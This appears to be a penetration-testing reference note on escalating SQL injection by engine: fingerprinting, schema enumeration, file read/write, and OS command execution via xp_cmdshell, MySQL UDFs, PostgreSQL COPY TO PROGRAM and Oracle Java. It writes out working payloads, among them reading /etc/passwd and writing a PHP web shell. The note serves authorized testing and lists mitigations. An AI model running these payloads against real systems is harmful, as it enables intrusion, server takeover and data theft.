# DBMS-specific syntax and escalation to file read/write and RCE

Full detail behind SKILL.md sections 3 and 5. From notes 04, 19, 20, 21, 24. Fingerprint the engine, then use its exact syntax; escalate only where the DB account is privileged and the engagement authorizes it.

## Fingerprint the DBMS
A method that works on only one engine identifies it:
- Concatenation: Oracle/PG `'a'||'b'`, MSSQL `'a'+'b'`, MySQL `CONCAT('a','b')` / `'a' 'b'`.
- Version: MSSQL/MySQL `SELECT @@version`; PG `version()`; Oracle `SELECT banner FROM v$version`.
- Comment: MySQL `#` and `-- ` (trailing space); all `--`, `/* */`.
- Time: MySQL `SLEEP`, PG `pg_sleep`, MSSQL `WAITFOR DELAY`, Oracle `dbms_pipe.receive_message`.

## Enumerate the schema
- Tables/columns: `information_schema.tables` / `.columns` (MySQL/PG/MSSQL); Oracle `all_tables` / `all_tab_columns`.
- Identity/privilege: `current_user()` / `@@version` / `SELECT user` / `SELECT @@hostname`. Knowing the account is `sa`/`root`/DBA or has `FILE` tells you whether file ops and RCE are reachable.

## Stacked (batched) queries
`q1; q2` on MSSQL/PG/MySQL (Oracle: none; MySQL rarely, only via some PHP/Python drivers). Results of later statements are not returned, so stacked queries are for blind side effects (DNS, error, time) and for `EXEC`/config changes. The GraphQL case (note 12) used `;SELECT pg_sleep(30);`.

## File read / write
- MySQL: `LOAD_FILE('/etc/passwd')` to read (needs `FILE` priv + `secure_file_priv`); `SELECT ... INTO OUTFILE '/var/www/shell.php'` to write (also used for OOB on Windows via a UNC path). Note 06, 24.
- MSSQL: `OPENROWSET(BULK ...)` to read; `xp_dirtree`/`xp_fileexist` for FS/DNS.
- PostgreSQL: `COPY ... FROM/TO` a file (superuser), or `pg_read_file()`.
- Oracle: `UTL_FILE`.

## RCE by DBMS (note 20; note 19 for the MSSQL walkthrough)
Each needs elevated DB privilege. `sqlmap --os-shell` automates picking the right one.
- **MSSQL `xp_cmdshell`** (note 19): disabled by default, but a sysadmin context re-enables it:
  ```
  EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC master..xp_cmdshell 'whoami';
  ```
- **MySQL UDF**: compile a `.so`/`.dll` exporting `sys_exec()` (calls `system()`), place it in the plugin dir (needs write access), `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so'; SELECT sys_exec('whoami');`.
- **PostgreSQL**: `CREATE EXTENSION plpythonu; CREATE FUNCTION exec_cmd(text) ... os.system(cmd) LANGUAGE plpythonu; SELECT exec_cmd('whoami');` or `COPY (SELECT '') TO PROGRAM 'id'` (superuser).
- **Oracle**: a `CREATE JAVA SOURCE` running `Runtime.getRuntime().exec(cmd)`, wrapped in a PL/SQL function, `SELECT exec_cmd('whoami') FROM dual`.

## Why escalation often works (and the fix)
In note 19, the app's DB account was `sa` (CWE-269), so a SQLi became OS RCE (CVSS 10, scope change DB -> OS). The mitigation layers: parameterize (stop the injection), run the app on a least-privilege DB account (no DBA/`FILE`), keep `xp_cmdshell` off and un-re-enableable by the app account, and suppress verbose errors. Any one of these would have limited the impact.

## Minimal, authorized proof
Demonstrate RCE/file access with a benign command (`whoami`) or reading a non-sensitive marker, only inside an explicitly authorized engagement. Never run destructive OS commands or exfiltrate real data.
